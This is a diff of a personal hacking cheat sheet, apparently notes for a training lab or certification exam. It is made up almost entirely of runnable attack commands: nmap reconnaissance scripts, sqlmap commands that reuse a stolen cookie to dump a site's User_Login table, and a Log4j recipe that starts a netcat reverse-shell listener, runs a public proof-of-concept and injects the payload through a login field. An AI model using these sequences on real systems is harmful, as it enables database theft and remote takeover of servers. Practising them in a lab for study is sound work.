@@ -15,6 +15,11 @@ tshark -r ~/MQTT.pcapng -Y 'mqtt' -T fields -e mqtt.msg --> grep -i "text"
 tshark -r ~/Documents/And_Dos.pcapng -q -z expert
 
 
+nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com
+--script http-enum
+--script http-trace -d domain name (website with www)
+
+
 
 Hosting Information: 
 nc -vv www.moviescope.com 80
@@ -27,7 +32,7 @@ GET / HTTP/1.0
 
 
 SQLi:
-document.cookie
+document.cookie after login with sqli, copy link and continue as below.
 sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#7]" --dbs
 sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope --tables
 sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope -T User_Login --dump
@@ -139,4 +144,11 @@ Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access
 
 
 
-
+Finance Page --> Log4j Vuln --> log4j-shell-poc 
+move the jdk1.8.0_202 into /usr/bin/. To do that, type mv jdk1.8.0_202 /usr/bin/ and press Enter
+in line 62, 87, 99 replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac in poc.py
+nc -lvnp 4040
+python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 4040
+If any error occurs realted path, remove "CUR_FOLDER" Before from the path
+copy the payload generated in the send me: section
+in Username field paste the payload that was copied in previous step and in Password field type password and press Login
